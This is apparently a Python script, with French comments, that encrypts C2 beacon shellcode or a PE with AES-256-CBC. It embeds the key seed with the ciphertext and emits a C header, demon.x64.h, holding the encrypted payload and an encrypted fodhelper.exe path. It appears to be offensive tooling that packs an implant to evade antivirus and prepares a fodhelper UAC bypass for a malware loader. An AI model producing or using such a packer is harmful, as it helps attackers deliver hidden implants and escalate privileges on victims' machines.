#!/usr/bin/env python3

import os
import secrets
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

def generate_seed_derive_key(seed_bytes):
    salt_hash = hashes.Hash(hashes.SHA256(), backend=default_backend())
    salt_hash.update(seed_bytes[:16])
    derived_salt = salt_hash.finalize()[:16]
    
    kdf = PBKDF2HMAC(hashes.SHA256(), 48, derived_salt, 100000)
    key_iv = kdf.derive(seed_bytes)
    
    return key_iv[:32], key_iv[32:], derived_salt

def format_c_array(data):
    lines = []
    for i in range(0, len(data), 12):
        line = ', '.join(f"0x{b:02x}" for b in data[i:i+12])
        lines.append(f"    {line}")
    return ',\n'.join(lines)

def preview_hex(data, name):
    if len(data) == 0:
        return f"{name}: [vide]"
    first8 = data[:8].hex()
    last8 = data[-8:].hex()
    return f"{name}: {len(data)}b [{first8}...{last8}]"

def encrypt_with_seed(input_file, output_file):
    print("aes encryption - demon.x64.h")
    
    if not os.path.exists(input_file):
        print(f"❌ {input_file} introuvable")
        return False

    with open(input_file, 'rb') as f:
        plaintext = f.read()

    seed = secrets.token_bytes(42)
    key, iv, salt = generate_seed_derive_key(seed)

    print(f"[+] seed (42 bytes): {seed.hex()}")
    print(f"[+] salt (dyn): {salt.hex()}")
    print(f"[+] key (aes256): {key.hex()}")
    print(f"[+] iv (cbc): {iv.hex()}")
    
    print("")  
    
    print(preview_hex(plaintext, f"[+] {os.path.basename(input_file)}"))
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    pad_len = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad_len] * pad_len)
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    final_payload = seed + ciphertext  # ← SEED + cipher

    print(preview_hex(final_payload, "[+] payload_enc"))

    # FODHELPER SANS SEED
    fod_plain = b"C:\\Windows\\System32\\fodhelper.exe"
    pad_len_fod = 16 - (len(fod_plain) % 16)
    padded_fod = fod_plain + bytes([pad_len_fod] * pad_len_fod)

    encryptor_fod = cipher.encryptor()
    cipher_fod = encryptor_fod.update(padded_fod) + encryptor_fod.finalize()
    fodhelper_enc = cipher_fod  # ← UNIQUEMENT cipher (48 bytes)

    print(preview_hex(fodhelper_enc, "[+] fodhelper_enc"))  # ← 48b maintenant !

    with open(output_file, 'wb') as f:
        f.write(final_payload)

    payload_array = format_c_array(final_payload)
    fod_array = format_c_array(fodhelper_enc)

    header_content = f"""// demon.x64.h - PAYLOAD + FODHELPER (SEED dans payload UNIQUEMENT)
// Généré automatiquement

#ifndef DEMON_X64_H
#define DEMON_X64_H

unsigned char payload_enc[] = {{
{payload_array}
}};
unsigned int payload_enc_len = {len(final_payload)};

static unsigned char fodhelper_enc[] = {{
{fod_array}
}};
static const size_t fodhelper_enc_len = {len(fodhelper_enc)};

#endif
"""

    with open("demon.x64.h", 'w') as f:
        f.write(header_content)

    print("")
    print(f"[+] demon.x64.h généré")
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='aes encryption')
    parser.add_argument('-i', '--input', required=True, help='beacon pe/shellcode')
    parser.add_argument('-o', '--output', required=True, help='payload chiffré')
    args = parser.parse_args()

    success = encrypt_with_seed(args.input, args.output)
    exit(0 if success else 1)
